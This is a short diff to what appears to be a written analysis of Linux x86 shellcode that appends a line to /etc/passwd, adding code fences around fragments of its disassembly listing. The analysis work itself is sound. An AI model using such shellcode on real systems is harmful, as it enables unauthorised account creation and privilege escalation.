@@ -60,6 +60,7 @@ The shellcode appends this line to "/etc/passwd"
 Then the shellcode exits without setting a specific status code:
 `exit();`
 
+```
 00000025  93                xchg eax,ebx
 00000026  E822000000        call 0x4d				
 0000002B  7573              jnz 0xa0
@@ -89,3 +90,4 @@ Then the shellcode exits without setting a specific status code:
 00000056  6A01              push byte +0x1
 00000058  58                pop eax
 00000059  CD80              int 0x80
+```
